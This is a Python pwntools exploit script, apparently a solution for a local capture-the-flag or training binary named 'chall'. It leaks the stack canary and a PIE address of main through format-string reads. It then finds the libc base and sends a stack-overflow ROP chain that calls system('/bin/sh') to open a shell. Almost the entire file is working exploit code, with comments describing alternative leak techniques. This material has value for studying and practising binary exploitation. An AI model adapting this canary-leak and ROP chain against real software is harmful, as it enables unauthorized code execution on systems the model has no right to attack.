from pwn import *

#RELRO, PIE, CANARY, NX

context.binary = elf = ELF("/home/kali/Desktop/offsec/prove/07_research/chall", checksec=False)
libc = elf.libc

canary_offset =  72   #with gdb, send cyclic and check rax before stack check fail, p/x $rax or info registers rax

saved_rip_offset = canary_offset + 16

fs_canary_index = 15    #to leak canary
fs_main_index = 17  #0x55555555538d, corresponds to main+114 (gdb info symbol 0x55555555538d)

p = process(elf.path)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'interesting:\n', f'%{fs_canary_index}$p'.encode())   
p.recvuntil(b'said:\n')
leak = p.recvline().strip()

canary = int(leak, 16)
print(f"Found canary: {hex(canary)}")

p.sendlineafter(b'else?\n', b'dummy')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'interesting:\n', f'%{fs_main_index}$p'.encode())    #%{fs_main_index}$p
p.recvuntil(b'said:\n')
leak = p.recvline().strip()

main_addr = int(leak, 16)
print(f"Found main+113 leak: {hex(main_addr)}")

p.sendlineafter(b'else?\n', b'dummy')

elf.address = main_addr - (elf.sym.main + 113)

# if i have both local and remote binary, 
# leak a libc address (fs index 1), 
# get offset = leak - libc_base_local; libc_base_local = p.libs()[libc_local.path] 
# libc_base_remote = leak_remote - offset

# or leak with puts@plt
#payload =
    # padding +
    # canary +
    # saved_rbp +
    # pop_rdi_ret +
    # p64(elf.got["read"]) +
    # p64(elf.plt["puts"]) +
    # p64(elf.sym["main"])

# but i don't have pop_rdi gadget in the elf, so option 1 in this case

libc.address = p.libs()[libc.path]

rop = ROP(libc)
ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi_ret_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))

payload = flat(
    b'A'*canary_offset,
    p64(canary),
    b'B'*8,
    p64(ret_gadget),
    p64(pop_rdi_ret_gadget), p64(binsh),
    p64(system)
)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'interesting:\n', b'dummy')
p.sendlineafter(b'else?\n', payload)
p.interactive()